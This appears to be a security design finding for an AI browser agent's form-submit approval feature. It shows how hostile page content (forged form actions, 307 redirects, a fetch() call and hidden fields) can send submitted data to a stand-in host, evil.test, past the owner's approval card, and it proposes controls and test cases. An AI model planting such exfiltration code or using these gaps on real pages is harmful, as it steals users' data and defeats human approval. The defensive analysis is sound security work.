# design-10: the form-submit binding covers the page, not where the data goes

**Severity:** High. **Surface:** browser submit, origin policy on redirects. **Docs:** 05 §3.5 (browser form submit), §6 (allowlists on `will-redirect`), §16.2; 04 §4.2 `browser_submit`. **Owners:** S08, S05.

## Attack

The binding is `origin + pathname + sorted field names + values digest (+ submit ref)` of the **page**. Where the form actually sends the data is not bound:

1. **`action` / `formaction`.** On a page of a read-writable origin with user content (a forum, a CMS preview, a Google Sites page), the attacker places `<form action="https://evil.test/c" method="post">` with the same field names as the real form, or sets `formaction` on a submit button. The card says "Submit form on `https://forum.example/settings`", the hash matches, and the data goes to `evil.test`. `will-navigate` catches the cross-origin navigation only *after* the POST body has left, and a `target=_blank` or `fetch()`-driven submit does not navigate the tab at all.
2. **307/308 redirects keep the method and body.** The real form posts to `https://shop.example/checkout`, and the server (or an open redirect on it) answers `307 Location: https://evil.test/`. The browser re-POSTs the body to `evil.test`. Checking `will-redirect` blocks the *navigation*, but only if it is checked synchronously before the request is re-sent. The design does not say whether the check aborts the request or only the commit.
3. **JS submission.** On read-writable origins page JS runs normally, so a click on "Save" can `fetch("https://evil.test", {body: new FormData(form)})`. The design treats the click as the side effect; the egress is the page's.
4. **Values digest is not what the owner sees** (05 §16.2). Hidden inputs get sorted names and a digest, but the card shows visible fields, so `<input type=hidden name=forward_to value=evil@x>` is approved unseen.

## Assumption broken

"Origin + path identifies the side effect." For forms, the side effect is `(method, resolved action URL, the full encoded body)`.

## Proposed control

- Bind `method`, the **resolved `action` URL** (taking `formaction`, `<base href>` and relative URLs into account), and every field including hidden ones. The card lists hidden fields explicitly ("3 hidden fields: …").
- Run the origin-set check on the resolved action before dispatch: a cross-origin action is a separate `new_origin` ask.
- For submits from the agent, intercept the request at `session.webRequest.onBeforeRequest` (or CDP `Fetch.requestPaused`) and **compare the outgoing request to the binding** (method, URL, body digest). Fail closed on mismatch, including any 307/308 hop to a different origin (cancel inside `onBeforeRedirect`/`requestPaused`, before the re-send).
- During an agent-initiated submit window (for example 2 s), any page-initiated request to an origin outside the Task's origin set is blocked and audited.

## Test case

| # | Fixture page on `https://forum.example/settings` | Agent action | Expected |
| --- | --- | --- | --- |
| 1 | `<form action="https://evil.test/c" method=post>` with fields `email,name` | approve submit, then dispatch | binding includes `action: https://evil.test/c`; card shows it; blocked as `new_origin` |
| 2 | submit button `formaction="https://evil.test/c"` | submit | same as 1 |
| 3 | server answers `307 → https://evil.test/` | submit (approved) | no request with the body reaches the `evil.test` fixture server; receipt `failed` (`redirect_cross_origin`) |
| 4 | `onclick` handler `fetch("https://evil.test", {method:"POST", body:new FormData(f)})` | click | the `evil.test` fixture receives 0 requests |
| 5 | hidden `forward_to=evil@x` | request approval | card details list the hidden field; changing it after approval → `binding_mismatch` |
